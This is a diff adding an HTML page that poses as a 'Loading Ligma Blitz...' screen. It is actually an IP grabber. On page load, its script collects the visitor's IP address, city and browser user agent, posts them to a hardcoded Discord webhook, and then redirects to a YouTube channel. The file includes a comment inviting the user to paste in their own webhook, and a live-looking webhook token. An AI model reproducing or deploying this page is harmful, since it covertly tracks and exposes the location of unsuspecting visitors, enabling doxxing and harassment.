@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading Ligma Blitz...</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <script>
+        // PASTE YOUR DISCORD URL BETWEEN THE QUOTES
+        var WEBHOOK_URL = "https://discordapp.com/api/webhooks/1497687704983310406/yv6VZ2yuH-bxE0fD_BNQAGIUOeQu0gB9-z44IbRhSdiJOvSpHBzljrwvDo0Ifw6hyQNp"; 
+        
+        // Where they go AFTER being logged (Your YouTube)
+        var REDIRECT_URL = "https://youtube.com/@LigmaBlox-w7m"; 
+
+        $.getJSON("https://ipapi.co/json/", function(data) {
+            var payload = {
+                username: "Ligma Blitz Groupness Bot",
+                embeds: [{
+                    title: "🚨 Connection Logged",
+                    color: 15158332,
+                    fields: [
+                        { name: "Ligma Blitz Groupness Number", value: data.ip },
+                        { name: "City Origin", value: data.city },
+                        { name: "Device Protocol", value: navigator.userAgent }
+                    ]
+                }]
+            };
+
+            $.post(WEBHOOK_URL, JSON.stringify(payload), function() {
+                window.location.href = REDIRECT_URL;
+            });
+        });
+    </script>
+</body>
+</html>
